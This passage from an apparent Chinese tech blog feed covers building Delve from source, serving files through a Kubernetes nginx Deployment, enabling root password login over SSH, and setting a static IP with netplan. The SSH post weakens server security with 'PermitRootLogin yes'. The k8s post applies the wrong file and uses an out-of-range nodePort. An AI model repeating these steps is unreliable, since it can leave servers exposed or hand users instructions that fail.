class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan ~]<span class="hljs-comment"># wget https://github.com/go-delve/delve/archive/refs/tags/v1.20.0.tar.gz</span><br>[root@ningan ~]<span class="hljs-comment"># mkdir dlv</span><br>[root@ningan ~]<span class="hljs-comment"># mv v1.20.0.tar.gz  dlv</span><br>[root@ningan ~]<span class="hljs-comment"># cd dlv</span><br>[root@ningan dlv]<span class="hljs-comment"># ll</span><br>total 8980<br>drwxr-xr-x  2 root root    4096 Feb 13 10:19 ./<br>drwx------ 56 root root    4096 Feb 13 10:19 ../<br>-rw-r--r--  1 root root 9184679 Feb 13 10:18 v1.20.0.tar.gz<br><br><br>[root@ningan dlv]<span class="hljs-comment"># tar -zxvf v1.20.0.tar.gz</span><br>[root@ningan dlv]<span class="hljs-comment"># ll</span><br>total 8984<br>drwxr-xr-x  3 root root    4096 Feb 13 10:19 ./<br>drwx------ 56 root root    4096 Feb 13 10:19 ../<br>drwxrwxr-x 11 root root    4096 Dec  9 02:34 delve-1.20.0/<br>-rw-r--r--  1 root root 9184679 Feb 13 10:18 v1.20.0.tar.gz<br><br><br>[root@ningan delve-1.20.0]<span class="hljs-comment"># ll</span><br>total 168<br>drwxrwxr-x 11 root root  4096 Dec  9 02:34 ./<br>drwxr-xr-x  3 root root  4096 Feb 13 10:19 ../<br>drwxrwxr-x  2 root root  4096 Dec  9 02:34 assets/<br>-rw-rw-r--  1 root root 44712 Dec  9 02:34 CHANGELOG.md<br>-rw-rw-r--  1 root root   157 Dec  9 02:34 .cirrus.yml<br>drwxrwxr-x  3 root root  4096 Dec  9 02:34 cmd/<br>-rw-rw-r--  1 root root  2440 Dec  9 02:34 CONTRIBUTING.md<br>-rw-rw-r--  1 root root   248 Dec  9 02:34 .deepsource.toml<br>drwxrwxr-x  7 root root  4096 Dec  9 02:34 Documentation/<br>drwxrwxr-x 18 root root  4096 Dec  9 02:34 _fixtures/<br>-rw-rw-r--  1 root root    29 Dec  9 02:34 .gitattributes<br>-rw-rw-r--  1 root root   111 Dec  9 02:34 .gitignore<br>-rw-rw-r--  1 root root   868 Dec  9 02:34 go.mod<br>-rw-rw-r--  1 root root 40428 Dec  9 02:34 go.sum<br>-rw-rw-r--  1 root root   640 Dec  9 02:34 ISSUE_TEMPLATE.md<br>-rw-rw-r--  1 root root  1079 Dec  9 02:34 LICENSE<br>-rw-rw-r--  1 root root   970 Dec  9 02:34 Makefile<br>drwxrwxr-x 13 root root  4096 Dec  9 02:34 pkg/<br>-rw-rw-r--  1 root root  1632 Dec  9 02:34 README.md<br>drwxrwxr-x  2 root root  4096 Dec  9 02:34 _scripts/<br>drwxrwxr-x 10 root root  4096 Dec  9 02:34 service/<br>drwxrwxr-x  2 root root  4096 Dec  9 02:34 .teamcity/<br>drwxrwxr-x  6 root root  4096 Dec  9 02:34 vendor/<br><br>[root@ningan delve-1.20.0]<span class="hljs-comment"># cat Makefile</span><br>.DEFAULT_GOAL=<span class="hljs-built_in">test</span><br><br>SHELL := /bin/bash<br>GO_SRC := $(shell find . -<span class="hljs-built_in">type</span> f -not -path <span class="hljs-string">&#x27;./_fixtures/*&#x27;</span> -not -path <span class="hljs-string">&#x27;./vendor/*&#x27;</span> -not -path <span class="hljs-string">&#x27;./_scripts/*&#x27;</span> -not -path <span class="hljs-string">&#x27;./localtests/*&#x27;</span> -name <span class="hljs-string">&#x27;*.go&#x27;</span>)<br><br>check-cert:<br>        @go run _scripts/make.go check-cert<br><br>build: $(GO_SRC)<br>        @go run _scripts/make.go build<br><br>install: $(GO_SRC)<br>        @go run _scripts/make.go install<br><br>uninstall:<br>        @go run _scripts/make.go uninstall<br><br><span class="hljs-built_in">test</span>: vet<br>        @go run _scripts/make.go <span class="hljs-built_in">test</span><br><br>vet:<br>        @go vet $$(go list ./... | grep -v native)<br><br>test-proc-run:<br>        @go run _scripts/make.go <span class="hljs-built_in">test</span> -s proc -r $(RUN)<br><br>test-integration-run:<br>        @go run _scripts/make.go <span class="hljs-built_in">test</span> -s service/test -r $(RUN)<br><br>vendor:<br>        @go run _scripts/make.go vendor<br><br>build-ebpf-image:<br>        ./pkg/proc/internal/ebpf/build/build-ebpf-builder-img.sh<br><br>build-ebpf-object: build-ebpf-image<br>        ./pkg/proc/internal/ebpf/build/build-ebpf-objects.sh<br><br>.PHONY: vendor test-integration-run test-proc-run <span class="hljs-built_in">test</span> check-cert install build vet uninstall build-ebpf-image build-ebpf-object<br>[root@ningan delve-1.20.0]<span class="hljs-comment">#</span><br><br><br><br>[root@ningan delve-1.20.0]<span class="hljs-comment"># go run _scripts/make.go build</span><br>2023/02/13 10:20:28 error getting build SHA via git: %!w(*exec.ExitError=&amp;&#123;0xc0001980c0 []&#125;)<br>go build -ldflags <span class="hljs-string">&quot;-extldflags -static&quot;</span> -ldflags= github.com/go-delve/delve/cmd/dlv<br><br>[root@ningan delve-1.20.0]<span class="hljs-comment"># ll</span><br>total 17440<br>drwxrwxr-x 11 root root     4096 Feb 13 10:20 ./<br>drwxr-xr-x  3 root root     4096 Feb 13 10:19 ../<br>drwxrwxr-x  2 root root     4096 Dec  9 02:34 assets/<br>-rw-rw-r--  1 root root    44712 Dec  9 02:34 CHANGELOG.md<br>-rw-rw-r--  1 root root      157 Dec  9 02:34 .cirrus.yml<br>drwxrwxr-x  3 root root     4096 Dec  9 02:34 cmd/<br>-rw-rw-r--  1 root root     2440 Dec  9 02:34 CONTRIBUTING.md<br>-rw-rw-r--  1 root root      248 Dec  9 02:34 .deepsource.toml<br>-rwxr-xr-x  1 root root 17683376 Feb 13 10:20 dlv*<br>drwxrwxr-x  7 root root     4096 Dec  9 02:34 Documentation/<br>drwxrwxr-x 18 root root     4096 Dec  9 02:34 _fixtures/<br>-rw-rw-r--  1 root root       29 Dec  9 02:34 .gitattributes<br>-rw-rw-r--  1 root root      111 Dec  9 02:34 .gitignore<br>-rw-rw-r--  1 root root      868 Dec  9 02:34 go.mod<br>-rw-rw-r--  1 root root    40428 Dec  9 02:34 go.sum<br>-rw-rw-r--  1 root root      640 Dec  9 02:34 ISSUE_TEMPLATE.md<br>-rw-rw-r--  1 root root     1079 Dec  9 02:34 LICENSE<br>-rw-rw-r--  1 root root      970 Dec  9 02:34 Makefile<br>drwxrwxr-x 13 root root     4096 Dec  9 02:34 pkg/<br>-rw-rw-r--  1 root root     1632 Dec  9 02:34 README.md<br>drwxrwxr-x  2 root root     4096 Dec  9 02:34 _scripts/<br>drwxrwxr-x 10 root root     4096 Dec  9 02:34 service/<br>drwxrwxr-x  2 root root     4096 Dec  9 02:34 .teamcity/<br>drwxrwxr-x  6 root root     4096 Dec  9 02:34 vendor/<br>[root@ningan delve-1.20.0]<span class="hljs-comment">#</span><br><br>[root@ningan delve-1.20.0]<span class="hljs-comment"># ./dlv version</span><br>Delve Debugger<br>Version: 1.20.0<br>Build: <span class="hljs-variable">$Id</span>: 8ec46ee3d275c276b8e7465d69a23399e0e14789 $<br><br></code></pre></td></tr></table></figure><h2 id="2023-02-24-编译dlv-arm版"><a href="#2023-02-24-编译dlv-arm版" class="headerlink" title="2023.02.24 编译dlv arm版"></a>2023.02.24 编译dlv arm版</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">go</span> run _scripts/<span class="hljs-built_in">make</span>.<span class="hljs-keyword">go</span> build --GOARCH arm64<br></code></pre></td></tr></table></figure><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://kupczynski.info/posts/remote-debug-go-code/">远程调试你的代码</a>（重要）</p><p><a href="https://ask.csdn.net/questions/1031161">使用Delve调试时将参数传递给可执行文件</a></p><p><a href="bwangel.me/2022/01/12/go_gcflags/">Go gcflags&#x2F;ldflags 的说明</a></p><p><a href="https://blog.csdn.net/kevin_tech/article/details/125437640?app_version=5.6.1&csdn_share_tail=%7B%22type%22:%22blog%22,%22rType%22:%22article%22,%22rId%22:%22125437640%22,%22source%22:%22unlogin%22%7D&ctrtid=5I8VH&utm_source=app">真香预警，这个VSCODE可视化调试Go程序的方式，比直接用 dlv 命令香多了</a></p>]]></content>
    
    
    <categories>
      
      <category>software</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【k8s系列】(202207) 利用k8s的nginx搭建文件下载器</title>
    <link href="/2022/07/19/k8s/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91(202207)%20%E5%88%A9%E7%94%A8k8s%E7%9A%84nginx%E6%90%AD%E5%BB%BA%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E5%99%A8/"/>
    <url>/2022/07/19/k8s/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91(202207)%20%E5%88%A9%E7%94%A8k8s%E7%9A%84nginx%E6%90%AD%E5%BB%BA%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E5%99%A8/</url>
    
    <content type="html"><![CDATA[<h2 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h2><p>想通过k8s的nginx容器下载主机上的某个文件</p><p>方法：通过容器挂载文件挂载的方式，把主机文件下载目录挂载到nginx容器内，并且挂载主机上的nginx.conf文件到nginx容器内。当访问nginx时，会列出相应的文件进行下载即可</p><h2 id="操作流程"><a href="#操作流程" class="headerlink" title="操作流程"></a>操作流程</h2><h3 id="主机文件结构：nginx-conf文件-download文件夹"><a href="#主机文件结构：nginx-conf文件-download文件夹" class="headerlink" title="主机文件结构：nginx.conf文件 download文件夹"></a>主机文件结构：nginx.conf文件 download文件夹</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@master nginx]<span class="hljs-comment"># pwd</span><br>/root/nginx<br>[root@master nginx]<span class="hljs-comment"># tree</span><br>.<br>├── download<br>│   └── test.txt<br>└── nginx.conf<br><br>1 directory, 2 files<br>[root@master nginx]<span class="hljs-comment"># cat nginx.conf</span><br>user nginx;<br>worker_processes auto;<br>error_log /var/log/nginx/error.log;<br>pid /run/nginx.pid;<br>include /usr/share/nginx/modules/*.conf;<br>events &#123;<br>    worker_connections 1024;<br>&#125;<br>http &#123;<br>    log_format  main  <span class="hljs-string">&#x27;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &#x27;</span><br>                      <span class="hljs-string">&#x27;$status $body_bytes_sent &quot;$http_referer&quot; &#x27;</span><br>                      <span class="hljs-string">&#x27;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&#x27;</span>;<br>    access_log  /var/log/nginx/access.log  main;<br>    sendfile            on;<br>    tcp_nopush          on;<br>    tcp_nodelay         on;<br>    keepalive_timeout   65;<br>    types_hash_max_size 2048;<br>    default_type        application/octet-stream;<br>    <span class="hljs-comment"># Load modular configuration files from the /etc/nginx/conf.d directory.</span><br>    <span class="hljs-comment"># See http://nginx.org/en/docs/ngx_core_module.html#include</span><br>    <span class="hljs-comment"># for more information.</span><br>    include /etc/nginx/conf.d/*.conf;<br>    server &#123;<br>        listen       80 default_server;<br>        listen       [::]:80 default_server;<br>        server_name  _;<br>        <span class="hljs-comment"># Load configuration files for the default server block.</span><br>        include /etc/nginx/default.d/*.conf;<br>        location / &#123;<br>            root    /usr/share/nginx/html/download;<br>        autoindex on;    <span class="hljs-comment">#开启索引功能</span><br>        autoindex_exact_size off;  <span class="hljs-comment">#关闭计算文件确切大小（单位bytes），只显示大概大小（单位kb、mb、gb）</span><br>        autoindex_localtime on;   <span class="hljs-comment">#显示本机时间而非 GMT 时间</span><br>        &#125;<br>        error_page 404 /404.html;<br>            location = /40x.html &#123;<br>        &#125;<br>        error_page 500 502 503 504 /50x.html;<br>            location = /50x.html &#123;<br>        &#125;<br>    &#125;<br>&#125;<br><br>[root@master nginx]<span class="hljs-comment"># cat download/test.txt</span><br>Hello, anan<br>[root@master nginx]<span class="hljs-comment">#</span><br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220719115853392.png" alt="image-20220719115853392"></p><h3 id="k8s-nginx-yaml文件"><a href="#k8s-nginx-yaml文件" class="headerlink" title="k8s nginx yaml文件"></a>k8s nginx yaml文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@master nginx]<span class="hljs-comment"># cat nginx4.yaml</span><br>apiVersion: apps/v1<br>kind: Deployment<br>metadata:<br>  name: my-nginx<br>spec:<br>  replicas: 3<br>  selector:<br>    matchLabels:<br>      app: nginx<br>  template:<br>    metadata:<br>      labels:<br>        app: nginx<br>    spec:<br>      containers:<br>      - name: nginx<br>        image: nginx:1.20.1<br>        ports:<br>        - containerPort: 80<br>        volumeMounts:<br>          - name: conf<br>            mountPath: /etc/nginx/nginx.conf<br>            subPath: nginx.conf<br>          - name: download<br>            mountPath: /usr/share/nginx/html/download<br>      volumes:<br>        - name: conf<br>          hostPath:<br>            path: /root/nginx/<br>        - name: download<br>          hostPath:<br>            path: /root/nginx/download/<br>---<br>apiVersion: v1<br>kind: Service<br>metadata:<br>  name: ngx-service<br>  labels:<br>    app: nginx<br>spec:<br>  <span class="hljs-built_in">type</span>: NodePort<br>  selector:<br>    app: nginx<br>  ports:<br>  - port: 80<br>    targetPort: 80<br>    nodePort: 8899<br><br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220719120057356.png" alt="image-20220719120057356"></p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">kubectl <span class="hljs-built_in">apply</span> -f nginx.conf<br></code></pre></td></tr></table></figure><p>pod成功启动后，访问nodeport端口，可以看到下载列表，进行下载即可！</p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220719120130869.png" alt="image-20220719120130869"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/qq_39218530/article/details/108022907">使用docker搭建nginx文件下载服务器</a></p>]]></content>
    
    
    <categories>
      
      <category>k8s</category>
      
    </categories>
    
    
    <tags>
      
      <tag>k8s</tag>
      
      <tag>nginx</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【网络成长记】ubuntu首次SSH使用root账户远程登录</title>
    <link href="/2022/07/16/net/%EF%BC%88%E9%9C%80%E8%A6%81%E6%94%B9%E6%97%B6%E9%97%B4%EF%BC%89%E3%80%90%E7%BD%91%E7%BB%9C%E6%88%90%E9%95%BF%E8%AE%B0%E3%80%91ubuntu%E9%A6%96%E6%AC%A1SSH%E4%BD%BF%E7%94%A8root%E8%B4%A6%E6%88%B7%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95/"/>
    <url>/2022/07/16/net/%EF%BC%88%E9%9C%80%E8%A6%81%E6%94%B9%E6%97%B6%E9%97%B4%EF%BC%89%E3%80%90%E7%BD%91%E7%BB%9C%E6%88%90%E9%95%BF%E8%AE%B0%E3%80%91ubuntu%E9%A6%96%E6%AC%A1SSH%E4%BD%BF%E7%94%A8root%E8%B4%A6%E6%88%B7%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="ubuntu首次SSH使用root账户远程登录"><a href="#ubuntu首次SSH使用root账户远程登录" class="headerlink" title="ubuntu首次SSH使用root账户远程登录"></a>ubuntu首次SSH使用root账户远程登录</h1><p>release author: ningan123</p><p>release time: 2022-02-16</p><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><h3 id="1-安装ssh"><a href="#1-安装ssh" class="headerlink" title="1. 安装ssh"></a>1. 安装ssh</h3><p> ubuntu  都原生有了ssh客户端，可以通过ssh 命令检验.</p><p> <img src="https://img-blog.csdnimg.cn/0597cc190a9e4defb9cd2edc98458cb4.png" alt="在这里插入图片描述"><br>远程连接的服务器端没有自带，需要自行安装，命令为：</p><p>sudo apt install openssh-server</p><h3 id="2-检查ssh是否成功启动"><a href="#2-检查ssh是否成功启动" class="headerlink" title="2. 检查ssh是否成功启动"></a>2. 检查ssh是否成功启动</h3><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gradle"> <span class="hljs-regexp">/etc/i</span>nit.d/ssh status<br> systemctl status ssh<br>ps -e | <span class="hljs-keyword">grep</span> sshd<br></code></pre></td></tr></table></figure><h3 id="3-远程连接"><a href="#3-远程连接" class="headerlink" title="3. 远程连接"></a>3. 远程连接</h3><p>ssh username@ip</p><hr><h2 id="问题：可以远程连接普通用户-ningan-，但是却不可以远程连接root用户"><a href="#问题：可以远程连接普通用户-ningan-，但是却不可以远程连接root用户" class="headerlink" title="问题：可以远程连接普通用户(ningan)，但是却不可以远程连接root用户"></a>问题：可以远程连接普通用户(ningan)，但是却不可以远程连接root用户</h2><p>配置root用户SSH服务</p><p>Ubuntu中SSH服务安装完成后查看是否允许root用户登陆，若不允许则无法远程登陆root用户，需要修改配置</p><p>打开“&#x2F;etc&#x2F;ssh&#x2F;sshd_config”</p><p>sudo vim  &#x2F;etc&#x2F;ssh&#x2F;sshd_config</p><p>找到并用#注释掉这行：PermitRootLogin prohibit-password</p><p>查看是否有“PermitRootLogin yes”新建一行 添加：PermitRootLogin yes</p><p>重启服务</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/etc/i</span>nit.d/ssh restart<br>systemctl restart ssh<br><br></code></pre></td></tr></table></figure><p>用root连接的时候一直显示密码错误</p><p><strong>修改Ubuntu操作系统root默认密码</strong></p><p> 一、Ubuntu的 默认root密码是随机的，即每次开机都有一个新的root密码。我们可以在终端输入命令 sudo passwd，然后输入当前用户的密码， enter，</p><p> 二、终端会提示我们输入新的密码并确认，此时的密码就是root新密码。修改成功后，输入命令 su root，再输入新的密码就ok了。 </p><p>可以成功连接</p><p><img src="https://img-blog.csdnimg.cn/cd09fe53e108439ca4e13df258ab0972.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5a6J5a6JY3Nkbg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>参考：<a href="https://blog.csdn.net/howiecode/article/details/120457571">https://blog.csdn.net/howiecode/article/details/120457571</a></p>]]></content>
    
    
    <categories>
      
      <category>net</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【网络成长记】(202207) ubuntu20.04设置静态ip</title>
    <link href="/2022/07/16/net/%E3%80%90%E7%BD%91%E7%BB%9C%E6%88%90%E9%95%BF%E8%AE%B0%E3%80%91(202207)%20ubuntu20.04%E8%AE%BE%E7%BD%AE%E9%9D%99%E6%80%81ip/"/>
    <url>/2022/07/16/net/%E3%80%90%E7%BD%91%E7%BB%9C%E6%88%90%E9%95%BF%E8%AE%B0%E3%80%91(202207)%20ubuntu20.04%E8%AE%BE%E7%BD%AE%E9%9D%99%E6%80%81ip/</url>
    
    <content type="html"><![CDATA[<h2 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h2><p>问题：ssh远程连接的时候，发现连不上虚拟机。后来进到虚拟机里才看到是因为ip地址变了，所以想改成静态ip。</p><h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p>自 17.10 开始，Ubuntu 已放弃在 &#x2F;etc&#x2F;network&#x2F;interfaces 里设置静态 IP 的办法了，即使配置也不会生效，而是改成 netplan 方式 ，配置写在 &#x2F;etc&#x2F;netplan&#x2F;01-network-manager-all.yaml 或者类似名称的 yaml 文件里</p><p>Ubuntu20配置值静态ip时需要修改&#x2F;etc&#x2F;netplan下面01-network-manager-all.yaml这个文件。</p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220716164159864.png" alt="image-20220716164159864"></p><h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><h3 id="查看原始ip地址"><a href="#查看原始ip地址" class="headerlink" title="查看原始ip地址"></a>查看原始ip地址</h3><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220716165308432.png" alt="image-20220716165308432"></p><h3 id="要修改-x2F-etc-x2F-netplan下面01-network-manager-all-yaml这个文件"><a href="#要修改-x2F-etc-x2F-netplan下面01-network-manager-all-yaml这个文件" class="headerlink" title="要修改&#x2F;etc&#x2F;netplan下面01-network-manager-all.yaml这个文件"></a>要修改&#x2F;etc&#x2F;netplan下面01-network-manager-all.yaml这个文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br>[root@ningan ~]<span class="hljs-comment">#</span><br>[root@ningan ~]<span class="hljs-comment"># cat /etc/netplan/01-network-manager-all.yaml</span><br><span class="hljs-comment"># Let NetworkManager manage all devices on this system</span><br>network:<br>  version: 2<br>  renderer: NetworkManager<br>  ethernets:<br>    eth0:                           <span class="hljs-comment"># 配置网卡的名称,通过 ip a 命令查看</span><br>      dhcp4: <span class="hljs-literal">false</span>                    <span class="hljs-comment"># 关闭 DHCP，如果需要打开 DHCP 则写 true</span><br>      addresses: [172.24.48.67/20]    <span class="hljs-comment"># 配置的静态 IP 地址和掩码</span><br>      optional: <span class="hljs-literal">true</span><br>      gateway4: 172.24.48.1            <span class="hljs-comment"># 网关地址</span><br>      nameservers:<br>        addresses: [8.8.8.8,114.114.114.114]       <span class="hljs-comment"># DNS 服务器地址，多个 DNS 服务器地址需要用英文逗号分隔开</span><br>[root@ningan ~]<span class="hljs-comment">#</span><br><br></code></pre></td></tr></table></figure><p>网关地址如何确定呢？</p><p>我用的是hyper-v启动的虚拟机，</p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220716165746966.png" alt="image-20220716165746966"></p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220716165911473.png" alt="image-20220716165911473"></p><h3 id="重启网络"><a href="#重启网络" class="headerlink" title="重启网络"></a>重启网络</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan ~]<span class="hljs-comment"># netplan apply</span><br></code></pre></td></tr></table></figure><h3 id="查看网卡设置是否生效"><a href="#查看网卡设置是否生效" class="headerlink" title="查看网卡设置是否生效"></a>查看网卡设置是否生效</h3><p>如下：</p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220716165204632.png" alt="image-20220716165204632"></p><p>已经生效！</p><h3 id="测试网络连通性"><a href="#测试网络连通性" class="headerlink" title="测试网络连通性"></a>测试网络连通性</h3><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220716165432286.png" alt="image-20220716165432286"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/weixin_56752399/article/details/115564741?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-1-115564741-blog-122279914.pc_relevant_sortByStrongTime&spm=1001.2101.3001.4242.2&utm_relevant_index=4">Ubuntu 20.10设置静态IP地址</a><br><a href="https://blog.csdn.net/vincent_duan/article/details/120145526">Hyper-V 和Ubuntu Server 16.04 配置静态IP</a></p>]]></content>
    
    
    <categories>
      
      <category>net</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【虚拟机】(202207) ubuntu20.04设置静态ip</title>
    <link href="/2022/07/16/net/%E3%80%90%E8%99%9A%E6%8B%9F%E6%9C%BA%E3%80%91(202207)%20ubuntu20.04%E8%AE%BE%E7%BD%AE%E9%9D%99%E6%80%81ip/"/>
    <url>/2022/07/16/net/%E3%80%90%E8%99%9A%E6%8B%9F%E6%9C%BA%E3%80%91(202207)%20ubuntu20.04%E8%AE%BE%E7%BD%AE%E9%9D%99%E6%80%81ip/</url>
    
    <content type="html"><![CDATA[<h2 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h2><p>问题：ssh远程连接的时候，发现连不上虚拟机。后来进到虚拟机里才看到是因为ip地址变了，所以想改成静态ip。</p><h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p>自 17.10 开始，Ubuntu 已放弃在 &#x2F;etc&#x2F;network&#x2F;interfaces 里设置静态 IP 的办法了，即使配置也不会生效，而是改成 netplan 方式 ，配置写在 &#x2F;etc&#x2F;netplan&#x2F;01-network-manager-all.yaml 或者类似名称的 yaml 文件里</p><p>Ubuntu20配置值静态ip时需要修改&#x2F;etc&#x2F;netplan下面01-network-manager-all.yaml这个文件。</p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220716164159864.png" alt="image-20220716164159864"></p><h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><h3 id="查看原始ip地址"><a href="#查看原始ip地址" class="headerlink" title="查看原始ip地址"></a>查看原始ip地址</h3><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220716165308432.png" alt="image-20220716165308432"></p><h3 id="要修改-x2F-etc-x2F-netplan下面01-network-manager-all-yaml这个文件"><a href="#要修改-x2F-etc-x2F-netplan下面01-network-manager-all-yaml这个文件" class="headerlink" title="要修改&#x2F;etc&#x2F;netplan下面01-network-manager-all.yaml这个文件"></a>要修改&#x2F;etc&#x2F;netplan下面01-network-manager-all.yaml这个文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 